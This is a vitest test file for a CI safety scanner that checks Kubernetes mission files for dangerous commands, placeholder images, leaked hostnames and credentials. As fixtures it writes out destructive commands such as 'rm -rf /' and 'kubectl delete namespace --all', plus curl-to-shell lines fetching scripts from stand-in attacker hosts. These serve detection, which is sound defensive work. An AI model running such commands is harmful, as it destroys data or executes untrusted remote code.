import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { scanFileForSafetyIssues, runSafetyScan } from '../mission-safety-scan.mjs'

describe('mission-safety-scan.mjs scanFileForSafetyIssues (CI observability)', () => {
  it('flags kubectl delete namespace/all --all as an error', () => {
    const { errors } = scanFileForSafetyIssues('fixes/x.json', 'kubectl delete namespace --all')
    expect(errors).toContain('Dangerous: kubectl delete all/namespace --all')
  })

  it('flags rm -rf against a root/home path as an error', () => {
    const { errors } = scanFileForSafetyIssues('fixes/x.json', 'rm -rf /')
    expect(errors).toContain('Dangerous: rm -rf with root/home path')
  })

  it('flags kubectl delete targeting a protected namespace as an error', () => {
    const { errors } = scanFileForSafetyIssues('fixes/x.json', 'kubectl delete pod foo -n kube-system')
    expect(errors).toContain('Dangerous: kubectl delete targeting protected namespace')
  })

  it('flags an unreplaced placeholder container image as an error', () => {
    const { errors } = scanFileForSafetyIssues('fixes/x.json', 'image: registry/org/image:tag')
    expect(errors).toContain('Placeholder container image not replaced')
  })

  it('flags an install mission with no actual install commands as an error', () => {
    const content = JSON.stringify({
      missionClass: 'install',
      mission: { steps: ['echo hello', 'echo world'] },
    })
    const { errors } = scanFileForSafetyIssues('fixes/x.json', content)
    expect(errors).toContain('Install mission has no actual install commands')
  })

  it('does not flag an install mission that has a real install command', () => {
    const content = JSON.stringify({
      missionClass: 'install',
      mission: { steps: ['helm install foo bar/foo'] },
    })
    const { errors } = scanFileForSafetyIssues('fixes/x.json', content)
    expect(errors).not.toContain('Install mission has no actual install commands')
  })

  it('does not flag a non-install mission with no install commands', () => {
    const content = JSON.stringify({
      missionClass: 'diagnostic',
      mission: { steps: ['echo hello'] },
    })
    const { errors } = scanFileForSafetyIssues('fixes/x.json', content)
    expect(errors).toEqual([])
  })

  it('warns on curl piped to shell from a non-official source', () => {
    const { warnings } = scanFileForSafetyIssues('fixes/x.json', 'curl https://evil.example.com/x | sh')
    expect(warnings).toContain('curl piped to shell from non-standard source — verify URL is official')
  })

  it('does not warn on curl piped to shell from an allow-listed official source', () => {
    const { warnings } = scanFileForSafetyIssues('fixes/x.json', 'curl https://get.k3s.io | sh')
    expect(warnings).not.toContain('curl piped to shell from non-standard source — verify URL is official')
  })

  it('does not warn on curl piped to shell from allow-listed raw.githubusercontent.com orgs (#3392)', () => {
    for (const url of [
      'curl -fsSL https://raw.githubusercontent.com/wasmcloud/wasmCloud/refs/heads/main/install.sh | bash',
      'curl -sSf https://raw.githubusercontent.com/WasmEdge/WasmEdge/master/utils/install.sh | bash',
      'curl -sLS https://raw.githubusercontent.com/kube-burner/kube-burner/refs/heads/main/hack/install.sh | sh',
    ]) {
      const { warnings } = scanFileForSafetyIssues('fixes/x.json', url)
      expect(warnings).not.toContain('curl piped to shell from non-standard source — verify URL is official')
    }
  })

  it('warns on curl piped to shell from a non-allow-listed raw.githubusercontent.com repo (#3392)', () => {
    const { warnings } = scanFileForSafetyIssues(
      'fixes/x.json',
      'curl -fsSL https://raw.githubusercontent.com/attacker/malware/main/install.sh | bash',
    )
    expect(warnings).toContain('curl piped to shell from non-standard source — verify URL is official')
  })

  it('warns on force delete with grace-period=0 (both overlapping checks fire)', () => {
    const { warnings } = scanFileForSafetyIssues('fixes/x.json', 'kubectl delete pod foo --force --grace-period=0')
    expect(warnings).toContain('Force delete with grace-period=0 — ensure this is intentional')
    expect(warnings).toContain('Contains --force --grace-period=0 pattern')
  })

  it('flags CLA boilerplate in resolutions as an error', () => {
    const { errors } = scanFileForSafetyIssues(
      'fixes/x.json',
      'I hereby agree to the terms of the CLA'
    )
    expect(errors).toContain('Resolution contains CLA boilerplate instead of actual content')
  })

  it('flags an unfilled PR template as an error', () => {
    const { errors } = scanFileForSafetyIssues(
      'fixes/x.json',
      'What is the problem you\'re trying to solve?'
    )
    expect(errors).toContain('Resolution contains unfilled PR template')
  })

  it('flags pip install kubectl/helm as an error', () => {
    const { errors } = scanFileForSafetyIssues('fixes/x.json', 'pip install kubectl')
    expect(errors).toContain('Uses pip install kubectl/helm — these are not the real tools')
  })

  it('flags a nonexistent Kubernetes version as an error', () => {
    const { errors } = scanFileForSafetyIssues('fixes/x.json', 'Requires Kubernetes v1.40')
    expect(errors).toContain('References nonexistent Kubernetes version')
  })

  it('warns on :latest tag only when the file path contains "install"', () => {
    const withInstall = scanFileForSafetyIssues('fixes/install/x.json', 'image: nginx:latest')
    const withoutInstall = scanFileForSafetyIssues('fixes/other/x.json', 'image: nginx:latest')
    expect(withInstall.warnings).toContain('Uses :latest tag — pin to specific version')
    expect(withoutInstall.warnings).not.toContain('Uses :latest tag — pin to specific version')
  })

  it('warns on a possible hardcoded credential', () => {
    const { warnings } = scanFileForSafetyIssues('fixes/x.json', '"password": "hunter2value"')
    expect(warnings).toContain("Possible hardcoded credential detected — verify it's a safe example value")
  })

  it('does not warn on an obvious placeholder credential value', () => {
    const { warnings } = scanFileForSafetyIssues('fixes/x.json', '"password": "changeme"')
    expect(warnings).not.toContain("Possible hardcoded credential detected — verify it's a safe example value")
  })

  it('flags a leaked cloud provider hostname as an error', () => {
    const { errors } = scanFileForSafetyIssues(
      'fixes/x.json',
      'endpoint: ip-10-0-0-1.us-east-1.compute.internal'
    )
    expect(errors).toContain('Leaked cloud provider hostname detected — must be anonymized')
  })

  it('warns on the deprecated k8s.gcr.io registry', () => {
    const { warnings } = scanFileForSafetyIssues('fixes/x.json', 'image: k8s.gcr.io/pause:3.9')
    expect(warnings).toContain('Uses deprecated k8s.gcr.io registry — should use registry.k8s.io')
  })

  it('returns no findings for a clean file', () => {
    const result = scanFileForSafetyIssues('fixes/x.json', JSON.stringify({ missionClass: 'diagnostic' }))
    expect(result).toEqual({ errors: [], warnings: [] })
  })
})

describe('mission-safety-scan.mjs runSafetyScan (CI observability)', () => {
  let dir

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'mission-safety-scan-test-'))
  })

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true })
  })

  it('skips files that no longer exist without erroring', () => {
    const result = runSafetyScan([join(dir, 'missing.json')])
    expect(result).toEqual({ filesScanned: 0, errorCount: 0, warningCount: 0, findings: [] })
  })

  it('aggregates errors and warnings across multiple files', () => {
    const clean = join(dir, 'clean.json')
    const dangerous = join(dir, 'dangerous.json')
    writeFileSync(clean, JSON.stringify({ missionClass: 'diagnostic' }))
    writeFileSync(dangerous, 'kubectl delete namespace --all\nimage: k8s.gcr.io/pause:3.9')

    const result = runSafetyScan([clean, dangerous])

    expect(result.filesScanned).toBe(2)
    expect(result.errorCount).toBe(1)
    expect(result.warningCount).toBe(1)
    expect(result.findings).toContainEqual({
      level: 'error',
      filePath: dangerous,
      message: 'Dangerous: kubectl delete all/namespace --all',
    })
    expect(result.findings).toContainEqual({
      level: 'warning',
      filePath: dangerous,
      message: 'Uses deprecated k8s.gcr.io registry — should use registry.k8s.io',
    })
  })

  it('reports zero findings and zero scanned when given no files', () => {
    const result = runSafetyScan([])
    expect(result).toEqual({ filesScanned: 0, errorCount: 0, warningCount: 0, findings: [] })
  })
})
